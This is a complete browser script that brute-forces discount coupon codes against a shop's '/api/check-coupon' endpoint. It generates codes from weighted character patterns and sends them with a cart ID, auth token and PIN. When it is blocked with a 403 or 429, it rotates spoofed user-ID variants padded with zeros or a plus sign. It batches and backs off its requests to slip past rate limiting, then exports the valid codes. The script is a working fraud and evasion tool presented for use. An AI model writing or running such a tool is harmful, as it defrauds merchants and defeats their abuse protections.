<script>
const digitWeights = { "1":0.2,"8":0.2,"9":0.18,"6":0.15,"0":0.12,"4":0.1,"2":0.015,"3":0.015,"5":0.015,"7":0.015 };
const letterWeights = {Z:.1,C:.1,N:.1,L:.08,J:.08,E:.08,A:.08,R:.07,T:.07,U:.06,W:.04,Y:.04,O:.04,Q:.03,K:.03,S:.03,D:.02,G:.02,X:.02,H:.02,F:.01,V:.01,M:.005,P:.005,B:.005,I:.005};
"ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("").forEach(l=>{if(!letterWeights[l]) letterWeights[l]=0.001;});

function weightedChoice(weights){
  const items=Object.keys(weights);
  const probs=Object.values(weights);
  const total=probs.reduce((a,b)=>a+b,0);
  let r=Math.random()*total;
  for(let i=0;i<items.length;i++){r-=probs[i]; if(r<=0) return items[i];}
  return items[items.length-1];
}

function generateCoupon(prefixInput="",mode="auto"){
  const cleanPrefix=(prefixInput||"").toUpperCase().replace(/[^A-Z0-9]/g,"");
  if(mode==="numeric"||(mode==="auto"&&/^T\d*$/.test(cleanPrefix))){
    let code=cleanPrefix.length>0?cleanPrefix:"T";
    while(code.length<11) code+=Math.floor(Math.random()*10);
    return code.slice(0,11);
  }
  let code=cleanPrefix.slice(0,10);
  let nextShouldBeDigit=code.length===0?true:isNaN(code[code.length-1]);
  while(code.length<10){code+=nextShouldBeDigit?weightedChoice(digitWeights):weightedChoice(letterWeights);nextShouldBeDigit=!nextShouldBeDigit;}
  return code;
}

function* userIdGenerator(baseUserId){
  for(let i=1;i<=127;i++) yield "0".repeat(i)+baseUserId;
  for(let i=1;i<=125;i++) yield "+"+"0".repeat(i)+baseUserId;
}

const sleep=ms=>new Promise(r=>setTimeout(r,ms));
let validCoupons=[];

// ---------------- Main form submission ----------------
document.getElementById("configForm").addEventListener("submit", async e=>{
  e.preventDefault();
  validCoupons=[];
  const cartId=document.getElementById("cartId").value;
  const authToken=document.getElementById("authToken").value;
  const baseUserId=document.getElementById("userId").value;
  const pin=document.getElementById("pin").value;
  const count=parseInt(document.getElementById("count").value);
  const prefix=document.getElementById("prefix").value.trim();
  const mode=document.getElementById("mode").value;
  const customCoupons=document.getElementById("customCoupons").value.trim();
  const tableBody=document.getElementById("resultTable");
  tableBody.innerHTML="";

  let coupons = customCoupons.length>0 ? customCoupons.split("\n").map(c=>c.trim()).filter(Boolean) : [];
  if(coupons.length===0){
    const generated=new Set();
    while(coupons.length<count){
      const c=generateCoupon(prefix,mode);
      if(!generated.has(c)){generated.add(c);coupons.push(c);}
    }
  }

  const userIds=userIdGenerator(baseUserId);
  let currentUserId=baseUserId;
  const batchSize=2; // smaller batch to reduce throttling

  for(let i=0;i<coupons.length;i+=batchSize){
    const batch=coupons.slice(i,i+batchSize);
    await Promise.all(batch.map(async (coupon,j)=>{
      const row=document.createElement("tr");
      row.innerHTML=`<td>${i+j+1}</td><td>${coupon}</td><td>⏳ Checking...</td><td></td><td>${currentUserId}</td>`;
      tableBody.appendChild(row);

      let attempt=0, success=false;
      while(attempt<5 && !success){ // allow more retries
        try{
          const res=await fetch("/api/check-coupon",{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({coupon,cartId,authToken,userId:currentUserId,pin})
          });

          // Switch userId immediately on 403
          if(res.status===403 || res.status===429){
            const nextId=userIds.next();
            if(!nextId.done){currentUserId=nextId.value; console.warn("⚠️ Blocked → switched User ID:",currentUserId);}
            attempt++;
            await sleep(5000 * attempt); // backoff
            continue;
          }

          // Check Content-Type to detect non-JSON responses
          const contentType=res.headers.get("content-type") || "";
          if(!contentType.includes("application/json")){
            throw new Error("API blocked or returned non-JSON");
          }

          let data;
          try { data = await res.json(); } 
          catch(e){ throw new Error("Malformed API response"); }

          if(data.result?.status==="success"||data.result?.result?.[0]?.applicable){
            const info=data.result?.additional_general_info||{};
            row.cells[2].innerHTML="✅ Valid";
            row.cells[3].innerHTML=`SUCCESS - cart_id: ${info.cart_id||"?"}, customer_id: ${info.customer_id||"?"}`;
            row.className="table-success";
            tableBody.insertBefore(row,tableBody.firstChild);
            validCoupons.push(coupon);
          } else {
            const reasonObj=data.error?.reason || data.result?.reason || data.result?.result?.[0] || {};
            row.cells[2].innerHTML="❌ Invalid";
            row.cells[3].innerHTML=`${reasonObj.reason_code||"UNKNOWN"} - ${reasonObj.reason_eng||"Unknown"}`;
            row.className="table-danger";
          }
          success=true;

        }catch(err){
          row.cells[2].innerHTML="⚠️ Error";
          row.cells[3].innerHTML=err.message;
          row.className="table-warning";
          attempt++;
          await sleep(5000 * attempt); // longer exponential backoff
        }
      }
    }));

    await sleep(7000); // delay between batches
  }
});

// ---------------- Download button ----------------
document.getElementById("downloadBtn").addEventListener("click", ()=>{
  if(validCoupons.length===0){alert("No valid coupons to download!"); return;}
  const blob=new Blob([validCoupons.join("\n")],{type:"text/plain"});
  const url=URL.createObjectURL(blob);
  const a=document.createElement("a");
  a.href=url; a.download="valid_coupons.txt"; a.click();
  URL.revokeObjectURL(url);
});
</script>
